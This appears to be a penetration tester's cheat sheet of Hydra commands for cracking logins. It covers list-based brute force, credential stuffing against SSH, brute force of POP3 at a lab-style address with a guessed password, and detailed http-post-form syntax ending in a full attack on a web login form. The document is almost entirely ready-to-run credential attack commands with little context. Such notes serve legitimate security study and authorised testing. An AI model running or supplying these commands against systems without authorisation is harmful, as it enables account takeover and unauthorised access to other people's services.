# Hydra

% hydra

## hydra - Crack passwords with user and password lists
```
hydra -L user.list -P password.list <service>://<ip>
```

## hydra - Crack passwords with a username and password list
```
hydra -l username -P password.list <service>://<ip>
```

## hydra - Crack passwords with a user list and password
```
hydra -L user.list -p password <service>://<ip>
```

## hydra - Credential stuffing attack
```
hydra -C <user_pass.list> ssh://<IP>
```
## hydra - Brute-force POP3
```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

## hydra - http-form tips
```
# hydra http-form tips

# general structure
hydra [options] target http-post-form "path:params:condition_string"

S=... # success condition
F=... # failure condition

Example :
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" # Failure if 'Invalid credentials' string found in response
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302" OK if response code is 302
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard" OK if 'Dashboard' string is found in response


`params` string consists of <mark style="background: #FFB86CA6;">key-value pairs</mark>, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.

- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.
- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).


hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
